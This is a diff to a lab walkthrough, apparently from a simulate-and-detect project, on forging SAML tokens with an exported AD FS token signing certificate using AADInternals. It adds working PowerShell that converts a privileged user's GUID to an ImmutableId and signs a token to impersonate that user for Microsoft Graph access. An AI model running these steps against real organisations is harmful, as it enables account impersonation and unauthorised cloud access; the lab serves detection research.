@@ -1,6 +1,6 @@
 # Forge SAML Tokens with Active Directory Federation Service (AD FS) Token Signing Certificate
 
-If a threat actor gets to steal the AD FS token signing certificate from an AD FS server, it is just a matter of time until it is used to sign SAML tokens and impersonate users in a federated environments. 
+If a threat actor gets to [export the AD FS token signing certificate](exportADFSTokenSigningCertificate.md) from an AD FS server, it is just a matter of time until it is used to sign new SAML tokens and impersonate users in a federated environment. 
 
 ## Sumulate & Detect
 1.	[Enumerate privileged accounts](#enumerate-privileged-accounts).
@@ -61,47 +61,55 @@ A threat actor would most likely do this outside of the organization. Therefore,
   * Authorization: Local Administrator
   * Libraries Installed: [AADInternals](https://github.com/Gerenios/AADInternals)
   * AD FS token signing certificate:
-    * In a previous simulation step, we [exported the AD FS token signing certificate as a PFX file](exportADFSCertificatesAsPfxFiles.md) to the `C:\ProgramData` directory with the name `ADFSTokenSigningCertificate.pfx` (default).
+    * In a previous step, we [exported the AD FS token signing certificate as a PFX file](exportADFSTokenSigningCertAsPfxFile.md) to the `C:\ProgramData` directory with the name `ADFSTokenSigningCertificate.pfx` (default).
 
 ### Convert User AD Object GUID to its Azure AD Immutable ID representation
 
-1.  Once we identify the privileged user we want to impersonate, we need to obtain the immutable ID of the account AD object GUID. The `ImmutableId` is the base64-encoded representation of a domain user GUID in Azure AD.
+1.  Once we identify the privileged user we want to impersonate, we need to obtain the `immutable ID` of the account AD object GUID. The `ImmutableId` is the base64-encoded representation of a domain user GUID in Azure AD.
 
 ```PowerShell
-$ObjectGUID = "07cd318c-b6ba-432e-9936-b992d7c78388"
+$Results[1].Samaccountname
+$Results[1].ObjectGuid
+$ObjectGUID = $Results[1].ObjectGuid
 $ImmutableId = [convert]::ToBase64String(([guid]$ObjectGUID).ToByteArray())
+$ImmutableId
 ```
 
 ![](../../resources/images/simulate_detect/credential-access/signSAMLToken/2021-05-19_02_get_immutable_id.png)
 
 ### Install AADInternals
 
-2.  On the same PowerShell session, run the following commands to install [AADInternals](https://github.com/Gerenios/AADInternals) if it is not installed yet: 
+2.  Start a new PowerShell session as administrator and run the following commands to install [AADInternals](https://github.com/Gerenios/AADInternals) if it is not installed yet: 
 
 ```PowerShell
-Install-Module –Name AADInternals –RequiredVersion 0.4.8 -Force 
-Import-Module –Name AADInternals
+Install-Module –Name AADInternals –RequiredVersion 0.4.8 -Force
+```
+
+3. Go back to the PowerShell session where you calculated the `ImmutableId` and import AADInternals
+
+```PowerSHell
+Import-Module AADInternals
 ```
 
 ### Sign a New SAML Token
 
-3. Use the `New-AADIntSAMLToken` function to sign a new SAML token. We would need:
-  * The `ImmutableID` we got in the first stecion.
+4. Use the `New-AADIntSAMLToken` function to sign a new SAML token with the following information:
+  * The `ImmutableID` we got in the first section.
   * The path to the token signing certificate file.
-  * The D FS token issuer url.
+  * The AD FS token issuer url.
 
 ```PowerShell 
-$ImmutableId = 'jDHNB7q2LkOZNrmS18eDiA=='
 $Cert = 'C:\ProgramData\ADFSTokenSigningCertificate.pfx'
 $Issuer = 'http://simulandlabs.com/adfs/services/trust/'
 $SamlToken = New-AADIntSAMLToken -ImmutableID $ImmutableId -PfxFileName $Cert -PfxPassword "" -Issuer $Issuer
+$SamlToken
 ```
 
 ![](../../resources/images/simulate_detect/credential-access/signSAMLToken/2021-05-19_04_sign_saml_token.png)
 
 ## Output
 
-Use the variable `$SamlToken` in the next step where we [get an access token via SAML bearer Assertion Flow](../persistence/getAccessTokenSAMLBearerAssertionFlow.md) for resources such as the Microsoft Graph API.
+Use the variable `$SamlToken` in the next step to [get an access token via SAML bearer assertion flow](../persistence/getAccessTokenSAMLBearerAssertionFlow.md) for resources such as the Microsoft Graph API.
 
 ## References
 * [Exporting ADFS certificates revisited: Tactics, Techniques and Procedures (o365blog.com)](https://o365blog.com/post/adfs/)
